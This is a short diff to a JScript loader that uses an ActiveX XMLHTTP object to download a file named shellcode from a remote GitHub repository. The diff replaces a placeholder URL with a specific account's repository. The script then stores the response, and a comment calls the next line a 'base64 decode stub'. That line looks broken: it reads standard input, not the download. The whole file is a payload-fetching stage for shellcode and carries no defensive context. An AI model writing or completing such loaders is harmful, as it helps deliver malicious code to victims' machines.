@@ -1,5 +1,5 @@
 var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-xhr.open("GET", "https://raw.githubusercontent.com/youruser/repo/main/shellcode.b64", false);
+xhr.open("GET", "https://github.com/MJansen6/bp/blob/main/shellcode.bin", false);
 xhr.send();
 var b64 = xhr.responseText;
 var sc = (new VBArray((new ActiveXObject("Scripting.FileSystemObject")).GetStandardStream(0).ReadAll().split('')).toArray()).map(function(c){return parseInt(c.charCodeAt(0).toString(16),16)}).join(''); // base64 decode stub - use better impl
